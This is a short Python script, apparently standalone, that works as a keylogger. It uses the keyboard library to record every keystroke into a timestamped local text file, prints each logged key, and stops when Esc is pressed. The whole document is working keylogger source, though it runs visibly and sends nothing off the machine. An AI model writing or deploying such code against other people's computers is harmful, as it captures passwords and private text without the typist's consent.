import keyboard
import datetime

# Create a log file with the current date and time
log_file = f"keylog_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"

def key_logger():
    with open(log_file, "w") as f:
        while True:
            key = keyboard.read_key()
            if key == "esc":  # Stop logging when the Esc key is pressed
                break
            f.write(f"{key}\n")
            print(f"Logged: {key}")

if __name__ == "__main__":
    print("Keylogger started. Press Esc to stop.")
    key_logger()